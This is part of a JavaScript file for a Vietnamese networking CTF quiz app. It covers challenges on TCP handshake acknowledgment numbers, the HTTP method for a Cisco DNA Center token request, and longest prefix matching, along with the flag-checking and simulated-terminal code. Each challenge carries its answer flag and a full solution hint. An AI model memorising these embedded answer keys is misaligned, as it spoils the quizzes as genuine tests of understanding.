                points: 200,
                description: "Máy Client gửi gói tin SYN khởi tạo kết nối TCP đến Server với Initial Sequence Number (ISN) = 1000. Để hoàn thành bước thứ 2 trong quá trình bắt tay, Server phải phản hồi gói tin SYN-ACK với giá trị Acknowledgment Number (AckN) bằng bao nhiêu?",
                codeSnippet: `Step 1: Client -> Server: [SYN] Seq = 1000
Step 2: Server -> Client: [SYN, ACK] Seq = 5000, Ack = ?

Nhiệm vụ: Tính giá trị trường Ack của gói tin SYN-ACK theo định dạng:
FLAG{ack_<giá_trị>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark</b>: Quan sát cờ SYN, ACK và trường Sequence/Ack number.<br>
            • <b>RFC 793 (Transmission Control Protocol)</b>: Quy tắc tiêu thụ 1 byte ảo của cờ SYN/FIN.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trong quá trình bắt tay 3 bước, cờ SYN chiếm 1 byte ảo trong không gian sequence number.<br>
            2. Do đó số xác nhận AckN luôn bằng SeqN + 1 = 1000 + 1 = <b>1001</b>.<br>
            3. Cờ: <code>FLAG{ack_1001}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{ack_1001}"
            },
            {
                id: 22,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 22: REST API Token Extraction (Tự Động Hóa Mạng)",
                category: "Lập Trình Mạng",
                difficulty: "Nâng cao",
                points: 250,
                description: "Bạn đang viết kịch bản Python tương tác với controller Cisco DNA Center để yêu cầu cấp mã xác thực Bearer Token. Phương thức HTTP Verb chuẩn nào được sử dụng khi gửi thông tin xác thực đăng nhập trong Request Body đến URI /dna/system/api/v1/auth/token?",
                codeSnippet: `import requests

url = "https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token"
headers = {"Content-Type": "application/json"}
# Điền phương thức HTTP thích hợp: get, post, put hay delete?
response = requests.request("???", url, auth=("devnetuser", "Cisco123!"))

Nhiệm vụ: Nộp cờ với tên phương thức HTTP ở dạng chữ thường:
FLAG{http_<method>_token}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Postman / Insomnia</b>: Gửi REST API Request thử nghiệm.<br>
            • <b>Cisco DevNet API Documentation</b>: DNA Center REST API Auth Endpoint.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Để gửi payload đăng nhập và yêu cầu tạo mới phiên làm việc/token, kiến trúc RESTful API luôn sử dụng phương thức <b>POST</b>.<br>
            2. Cờ: <code>FLAG{http_post_token}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{http_post_token}"
            },
            {
                id: 23,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 23: Master Flag: Longest Prefix Match Triage (Giải Mã Định Tuyến)",
                category: "Định Tuyến Cốt Lõi",
                difficulty: "Chuyên gia",
                points: 300,
                description: "Router nhận được gói tin có địa chỉ IP đích là 10.10.20.150. Trong bảng định tuyến có 4 tuyến đường thỏa mãn: 10.0.0.0/8 (Next-Hop A), 10.10.0.0/16 (Next-Hop B), 10.10.20.0/24 (Next-Hop C) và 10.10.20.128/26 (Next-Hop D). Theo luật Longest Prefix Match của Cisco, gói tin sẽ được chuyển tiếp qua Next-Hop nào?",
                codeSnippet: `Routing Table:
S    10.0.0.0/8 [1/0] via Next-Hop A
O    10.10.0.0/16 [110/2] via Next-Hop B
O    10.10.20.0/24 [110/10] via Next-Hop C
S    10.10.20.128/26 [1/0] via Next-Hop D

Destination IP: 10.10.20.150
Nhiệm vụ: Nhập tên Next-Hop và độ dài prefix dài nhất:
FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: <code>show ip route 10.10.20.150</code>.<br>
            • Nguyên lý Longest Prefix Match (LPM) trong bảng CEF (Cisco Express Forwarding).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Địa chỉ 10.10.20.150 thuộc dải 10.10.20.128 đến 10.10.20.191 của mạng con /26.<br>
            2. Đây là prefix cụ thể nhất (26 bits mạng). Next-Hop được chọn là <b>D</b>.<br>
            3. Cờ: <code>FLAG{next_hop_d_prefix_26}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{next_hop_d_prefix_26}"
            }
        ];

        this.solvedFlags = new Set(JSON.parse(localStorage.getItem('mmt_ctf_solved') || '[]'));
        this.activeChallengeIndex = 0;
        this.currentDomainFilter = 'all';

        this.initDOM();
        this.bindEvents();
    }

    initDOM() {
        this.ui = {
            totalPointsText: document.getElementById('ctf-total-points'),
            solvedCountBadge: document.getElementById('ctf-solved-count'),
            challengeNav: document.getElementById('ctf-challenge-nav'),
            cardTitle: document.getElementById('ctf-card-title'),
            cardDomain: document.getElementById('ctf-card-domain'),
            cardCategory: document.getElementById('ctf-card-category'),
            cardDifficulty: document.getElementById('ctf-card-difficulty'),
            cardPoints: document.getElementById('ctf-card-points'),
            cardDesc: document.getElementById('ctf-card-desc'),
            codeSnippet: document.getElementById('ctf-card-code'),
            hintToggleBtn: document.getElementById('ctf-hint-toggle-btn'),
            hintBox: document.getElementById('ctf-hint-box'),
            hintText: document.getElementById('ctf-hint-text'),
            flagInput: document.getElementById('ctf-flag-input'),
            submitBtn: document.getElementById('ctf-submit-btn'),
            statusBox: document.getElementById('ctf-status-box'),
            terminalInput: document.getElementById('ctf-terminal-input'),
            terminalOutput: document.getElementById('ctf-terminal-output'),
            domainFilters: document.getElementById('ctf-domain-filters'),
            filterCountBadge: document.getElementById('ctf-filter-count-badge')
        };
    }

    bindEvents() {
        if (!this.ui.submitBtn) return;

        this.ui.submitBtn.addEventListener('click', () => {
            this.handleSubmitFlag();
        });

        this.ui.flagInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.handleSubmitFlag();
            }
        });

        if (this.ui.hintToggleBtn) {
            this.ui.hintToggleBtn.addEventListener('click', () => {
                this.ui.hintBox.classList.toggle('hidden');
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Domain filter buttons
        if (this.ui.domainFilters) {
            this.ui.domainFilters.addEventListener('click', (e) => {
                const btn = e.target.closest('.ctf-filter-btn');
                if (!btn) return;
                const domain = btn.getAttribute('data-domain');
                this.filterByDomain(domain);
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Terminal CLI simulation
        if (this.ui.terminalInput) {
            this.ui.terminalInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const cmd = this.ui.terminalInput.value.trim();
                    this.ui.terminalInput.value = '';
                    this.handleTerminalCommand(cmd);
                }
            });
        }

        this.renderChallengeList();
        this.renderActiveChallenge();
        this.updateStats();
    }

    filterByDomain(domain) {
        this.currentDomainFilter = domain;

        // Update button states
        if (this.ui.domainFilters) {
            const btns = this.ui.domainFilters.querySelectorAll('.ctf-filter-btn');
            btns.forEach(b => {
                if (b.getAttribute('data-domain') === domain) {
                    b.classList.add('active');
                } else {
                    b.classList.remove('active');
                }
            });
        }

        // Check if current active challenge matches filter; if not, select first matching challenge
        const filtered = this.getFilteredChallenges();
        if (filtered.length > 0) {
            const current = this.challenges[this.activeChallengeIndex];
            if (this.currentDomainFilter !== 'all' && current && current.domain !== this.currentDomainFilter) {
                const firstMatchingIdx = this.challenges.findIndex(c => c.domain === this.currentDomainFilter);
                if (firstMatchingIdx !== -1) {
                    this.activeChallengeIndex = firstMatchingIdx;
                }
            }
        }

        this.renderChallengeList();
        this.renderActiveChallenge();
    }

    getFilteredChallenges() {
        if (this.currentDomainFilter === 'all') {
            return this.challenges;
        }
        return this.challenges.filter(c => c.domain === this.currentDomainFilter);
    }

    updateStats() {
        let total = 0;
        this.challenges.forEach(c => {
            if (this.solvedFlags.has(c.id)) {
                total += c.points;
            }
        });

        if (this.ui.totalPointsText) this.ui.totalPointsText.textContent = `${total} PTS`;
        if (this.ui.solvedCountBadge) this.ui.solvedCountBadge.textContent = `${this.solvedFlags.size} / ${this.challenges.length} Cờ Đã Giải`;
        if (this.ui.filterCountBadge) {
            const count = this.getFilteredChallenges().length;
            this.ui.filterCountBadge.textContent = `${count} bài`;
        }
    }

    renderChallengeList() {
        if (!this.ui.challengeNav) return;
        this.ui.challengeNav.innerHTML = '';

        const filtered = this.getFilteredChallenges();
        if (filtered.length === 0) {
            this.ui.challengeNav.innerHTML = '<div class="text-xs text-slate-500 p-4 text-center">Không có thử thách nào phù hợp.</div>';
            return;
        }

        filtered.forEach((c) => {
            const idx = this.challenges.findIndex(item => item.id === c.id);
            const btn = document.createElement('button');
            const isSolved = this.solvedFlags.has(c.id);
            const isActive = idx === this.activeChallengeIndex;

            btn.className = `ctf-nav-btn ${isActive ? 'active' : ''} ${isSolved ? 'solved' : ''}`;
            btn.innerHTML = `
                <div class="flex items-center justify-between">
                    <span class="font-bold text-xs truncate max-w-[210px]">${isSolved ? '✅' : '🚩'} Bài ${c.id}: ${c.category}</span>
                    <span class="text-xs text-cyan-400 font-mono font-bold shrink-0">+${c.points}p</span>
                </div>
                <div class="text-[11px] text-slate-400 truncate text-left mt-0.5">${c.title.split(':')[1] || c.title}</div>
                <div class="flex items-center gap-1.5 mt-1">
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-purple-950/80 text-purple-300 border border-purple-800/60">${c.domainVi.split('(')[0].trim()}</span>
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-slate-800 text-slate-300">${c.difficulty}</span>
                </div>
            `;

            btn.addEventListener('click', () => {
                this.activeChallengeIndex = idx;
                if (window.soundManager) window.soundManager.playClick();
                this.renderChallengeList();
                this.renderActiveChallenge();
            });

            this.ui.challengeNav.appendChild(btn);
        });

        this.updateStats();
    }

    renderActiveChallenge() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c) return;

        const isSolved = this.solvedFlags.has(c.id);

        if (this.ui.cardTitle) this.ui.cardTitle.textContent = c.title;
        if (this.ui.cardDomain) this.ui.cardDomain.textContent = c.domainVi;
        if (this.ui.cardCategory) this.ui.cardCategory.textContent = c.category;
        if (this.ui.cardDifficulty) this.ui.cardDifficulty.textContent = c.difficulty;
        if (this.ui.cardPoints) this.ui.cardPoints.textContent = `+${c.points} Điểm`;
        if (this.ui.cardDesc) this.ui.cardDesc.textContent = c.description;
        if (this.ui.codeSnippet) this.ui.codeSnippet.textContent = c.codeSnippet;
        if (this.ui.hintText) this.ui.hintText.innerHTML = c.hint;
        if (this.ui.hintBox) this.ui.hintBox.classList.add('hidden');

        if (this.ui.statusBox) this.ui.statusBox.classList.add('hidden');
        if (this.ui.flagInput) this.ui.flagInput.value = '';

        if (isSolved) {
            this.ui.flagInput.placeholder = "Bạn đã hoàn thành thử thách này!";
            this.ui.flagInput.disabled = true;
            this.ui.submitBtn.disabled = true;
            this.ui.submitBtn.innerHTML = "✅ ĐÃ CHIẾM CỜ";
            this.ui.submitBtn.className = "btn-secondary opacity-60";
        } else {
            this.ui.flagInput.placeholder = "Nhập cờ định dạng FLAG{...}";
            this.ui.flagInput.disabled = false;
            this.ui.submitBtn.disabled = false;
            this.ui.submitBtn.innerHTML = "🚩 Nộp Cờ (Submit Flag)";
            this.ui.submitBtn.className = "btn-primary";
        }
    }

    handleSubmitFlag() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c || this.solvedFlags.has(c.id)) return;

        const inputVal = this.ui.flagInput.value.trim();
        this.ui.statusBox.classList.remove('hidden');

        // Check flag case-insensitively or strictly
        const isCorrect = inputVal.toLowerCase() === c.flag.toLowerCase();

        if (isCorrect) {
            // Correct Flag
            if (window.soundManager) window.soundManager.playFlagCaptured();
            this.solvedFlags.add(c.id);
            localStorage.setItem('mmt_ctf_solved', JSON.stringify(Array.from(this.solvedFlags)));

            this.ui.statusBox.className = "p-3 rounded-xl bg-emerald-950/80 border border-emerald-500 text-emerald-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `🎉 CHÍNH XÁC! CỜ ĐÃ ĐƯỢC GIẢI MÃ THÀNH CÔNG! (+${c.points} Điểm)`;

            this.updateStats();
            this.renderChallengeList();
            this.renderActiveChallenge();

            // Append to terminal
            this.printTerminal(`[SUCCESS] Flag accepted for Challenge ${c.id}: ${c.title}! +${c.points} Points awarded!`, 'text-emerald-400 font-bold');
        } else {
            // Wrong Flag
            if (window.soundManager) window.soundManager.playWrong();
            this.ui.statusBox.className = "p-3 rounded-xl bg-rose-950/80 border border-rose-500 text-rose-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `❌ CỜ KHÔNG CHÍNH XÁC! Hãy kiểm tra lại log trích xuất hoặc nhấn "💡 Xem gợi ý giải mã cờ".`;

            this.printTerminal(`[FAIL] Invalid flag: "${inputVal}"`, 'text-rose-400');
        }
    }

    handleTerminalCommand(cmd) {
        if (!cmd) return;
        this.printTerminal(`guest@netlab:~$ ${cmd}`, 'text-cyan-300 font-bold');

        const parts = cmd.split(' ');
        const main = parts[0].toLowerCase();

        switch (main) {
            case 'help':
                this.printTerminal(
`[NETLAB CYBER TERMINAL CLI v3.0]
Các lệnh được hỗ trợ:
- list: Xem danh sách thử thách CTF theo bộ lọc
- cat: Đọc chi tiết thử thách hiện tại (Mô tả & Data Dump)
- hint: Xem gợi ý công cụ và giải pháp phân tích
- flag <FLAG{...}>: Nộp cờ nhanh qua Terminal
- tools: Cẩm nang công cụ an ninh mạng thực chiến (Wireshark, Nmap, Burp Suite, Hashcat, Volatility, Scapy, LinPEAS, Ghidra)
- b64 decode <chuỗi>: Giải mã Base64 nhanh trên console
- b64 encode <chuỗi>: Mã hóa Base64
- domain <all|1-8>: Lọc danh sách theo vùng hạ tầng (1: User, 2: Workstation, 3: LAN, 4: LAN-to-WAN, 5: WAN, 6: Remote, 7: System/Web, 8: CCNA)
- clear: Xóa màn hình terminal`, 'text-slate-200');
                break;

            case 'list':
                const filtered = this.getFilteredChallenges();
                this.printTerminal(`=== DANH SÁCH THỬ THÁCH (${filtered.length} BÀI) ===`, 'text-cyan-400 font-bold');
                filtered.forEach(c => {
                    const status = this.solvedFlags.has(c.id) ? '[✅ ĐÃ GIẢI]' : '[🚩 CHƯA GIẢI]';
                    const color = this.solvedFlags.has(c.id) ? 'text-emerald-400' : 'text-slate-300';
                    this.printTerminal(`${status} Bài ${c.id}: ${c.title} (+${c.points} pts)`, color);
                });
                break;

            case 'cat':
                const c = this.challenges[this.activeChallengeIndex];
                this.printTerminal(
`=== ${c.title} ===
[Vùng hạ tầng]: ${c.domainVi}
[Thể loại]: ${c.category} | [Độ khó]: ${c.difficulty} | [Điểm thưởng]: +${c.points}
------------------------------------------------------------
${c.description}

[Dữ liệu trích xuất]:
${c.codeSnippet}`, 'text-slate-200');
                break;

            case 'hint':
                const cur = this.challenges[this.activeChallengeIndex];
                // Strip HTML tags for clean terminal display
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = cur.hint;
                const cleanHint = tempDiv.innerText || tempDiv.textContent || "";
                this.printTerminal(`=== GỢI Ý BÀI ${cur.id} ===\n${cleanHint}`, 'text-amber-300');
                break;

            case 'tools':
                this.printTerminal(
`🛡️ BẢNG TRA CỨU CÔNG CỤ AN NINH MẠNG THỰC CHIẾN (CYBERSECURITY TOOLKIT):
----------------------------------------------------------------------
1. Wireshark / Tshark: Điều tra bắt gói tin mạng, phân tích giao thức (ARP, TCP, DNS, HTTP, SMB).
2. Nmap / NSE: Quét cổng, nhận diện phiên bản dịch vụ và quét lỗ hổng biên.
3. Burp Suite: Proxy kiểm thử thâm nhập ứng dụng Web (SQLi, XSS, CSRF, RCE, IDOR, JWT).
4. CyberChef: Con dao Thụy Sĩ giải mã Base64, Hex, URL, XOR, UTF-16LE, Hashing.
5. Hashcat / John the Ripper: Bẻ khóa mật khẩu và hash (MD5, SHA, NTLM, bcrypt).
6. Scapy: Thư viện Python chế tạo và phân mảnh gói tin IP/TCP bypass Firewall.
7. Volatility: Điều tra chứng cứ số trên bộ nhớ RAM (Memory Forensics), tìm malware ngầm.
8. LinPEAS / WinPEAS: Script tự động rà soát leo thang đặc quyền Linux/Windows.
9. Ghidra / IDA Pro / GDB: Dịch ngược nhị phân và khai thác tràn bộ đệm (Buffer Overflow).
10. Aircrack-ng suite: Bẻ khóa Wi-Fi WPA2, phát hiện Rogue AP / Evil Twin.`, 'text-cyan-300 font-mono');
                break;

            case 'b64':
                const action = parts[1] ? parts[1].toLowerCase() : '';
                const payload = parts.slice(2).join(' ');
                if (!action || !payload) {
                    this.printTerminal(`Cú pháp: b64 decode <chuỗi> HOẶC b64 encode <chuỗi>`, 'text-rose-400');
                    break;
                }
                try {
                    if (action === 'decode') {
                        // Standard base64 decode with UTF-16LE fallback check
                        const binaryStr = atob(payload.trim());
                        // Check if it's UTF-16LE (contains null bytes alternating)
                        let decoded = "";
                        if (binaryStr.includes('\x00')) {
                            // Decode as UTF-16LE
                            const bytes = new Uint8Array(binaryStr.length);
                            for (let i = 0; i < binaryStr.length; i++) {
                                bytes[i] = binaryStr.charCodeAt(i);
                            }
                            decoded = new TextDecoder('utf-16le').decode(bytes);
                        } else {
                            decoded = decodeURIComponent(escape(binaryStr));
                        }
                        this.printTerminal(`[B64 DECODED]: ${decoded}`, 'text-emerald-300 font-bold');
                    } else if (action === 'encode') {
                        const encoded = btoa(unescape(encodeURIComponent(payload)));
                        this.printTerminal(`[B64 ENCODED]: ${encoded}`, 'text-emerald-300 font-bold');
                    } else {
                        this.printTerminal(`Lệnh b64 chỉ hỗ trợ 'decode' hoặc 'encode'`, 'text-rose-400');
                    }
                } catch (err) {
                    this.printTerminal(`[LỖI]: Không thể xử lý chuỗi Base64: ${err.message}`, 'text-rose-400');
                }
                break;

            case 'domain':
                const domArg = parts[1] ? parts[1].toLowerCase() : '';
                const domainMap = {
                    'all': 'all',
                    '1': 'user',
                    'user': 'user',
                    '2': 'workstation',
                    'workstation': 'workstation',
                    '3': 'lan',
                    'lan': 'lan',
                    '4': 'lan-to-wan',
                    'lan-to-wan': 'lan-to-wan',
                    '5': 'wan',
                    'wan': 'wan',
                    '6': 'remote-access',
                    'remote': 'remote-access',
                    '7': 'system-app',
                    'system': 'system-app',
                    'web': 'system-app',
                    '8': 'networking',
                    'ccna': 'networking'
                };
                if (domainMap[domArg]) {
                    this.filterByDomain(domainMap[domArg]);
                    this.printTerminal(`[DOMAIN]: Đã chuyển bộ lọc sang "${domainMap[domArg]}"!`, 'text-cyan-300');
                } else {
                    this.printTerminal(`Cú pháp: domain <all|1-8>. Ví dụ: domain 1 (Vùng Người Dùng), domain 7 (Hệ Thống & Web).`, 'text-amber-300');
                }
                break;

            case 'flag':
            case 'submit':
                const flagVal = parts.slice(1).join(' ').trim();
                if (flagVal) {
                    this.ui.flagInput.value = flagVal;
                    this.handleSubmitFlag();
                } else {
                    this.printTerminal(`Cú pháp: flag FLAG{...}`, 'text-rose-400');
                }
                break;

            case 'clear':
                if (this.ui.terminalOutput) this.ui.terminalOutput.innerHTML = '';
                break;

            default:
                this.printTerminal(`Lệnh không nhận dạng: "${cmd}". Gõ "help" hoặc "tools" để xem trợ giúp.`, 'text-slate-500');
                break;
        }
    }

    printTerminal(text, colorClass = 'text-slate-300') {
        if (!this.ui.terminalOutput) return;
        const line = document.createElement('div');
        line.className = `${colorClass} whitespace-pre-wrap leading-relaxed py-0.5`;
        line.textContent = text;
        this.ui.terminalOutput.appendChild(line);
        this.ui.terminalOutput.scrollTop = this.ui.terminalOutput.scrollHeight;
    }
}

window.ctfEngine = new CTFEngine();
